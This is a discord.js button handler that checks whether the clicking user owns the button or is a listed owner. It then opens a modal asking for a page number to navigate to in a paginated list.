const { TextInputBuilder, ActionRowBuilder, TextInputStyle } = require("discord.js");

const emailMsg = require("../../utils/emails/emailMsg");
const modalBuilder = require('../../../autosecure/utils/modalBuilder')

module.exports = {
    name: "currentacc",
    callback: async (client, interaction) => {
        const [t, targetUserId] = interaction.customId.split("|");
        const isOwner = require("../../../db/isOwner");
        const isUserOwner = await isOwner(interaction.user.id);
        if (targetUserId && interaction.user.id !== targetUserId && !isUserOwner) {
            return interaction.reply({ content: "You do not have permission to use this button.", ephemeral: true });
        }
        interaction.showModal(modalBuilder(`currentaccmodal`, `Enter a page number to move to`, [{
            setCustomId: 'currentmodal',
            setMaxLength: 256,
            setMinLength: 0,
            setRequired: false,
            setLabel: "Navigate to:",
            setPlaceholder: "Page number",
            setStyle: TextInputStyle.Short
        }]));
    }
}
     

      